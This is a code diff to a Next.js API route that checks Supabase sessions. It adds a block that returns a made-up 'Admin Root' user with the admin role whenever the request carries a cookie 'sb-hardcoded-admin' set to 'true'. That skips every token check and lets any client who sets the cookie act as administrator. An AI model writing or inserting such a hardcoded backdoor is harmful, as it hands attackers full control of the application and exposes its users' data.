@@ -3,6 +3,20 @@ import { createClient } from "@supabase/supabase-js";
 
 export async function GET(request: NextRequest) {
   try {
+    // Bypass untuk hardcoded admin
+    const isHardcodedAdmin = request.cookies.get("sb-hardcoded-admin")?.value === "true";
+    if (isHardcodedAdmin) {
+      return NextResponse.json({
+        user: {
+          id: "hardcoded-admin",
+          email: "admin@root.local",
+          name: "Admin Root",
+          role: "admin",
+          status: "approved"
+        }
+      });
+    }
+
     const accessToken = request.cookies.get("sb-access-token")?.value;
     const userId = request.cookies.get("sb-user-id")?.value;
 
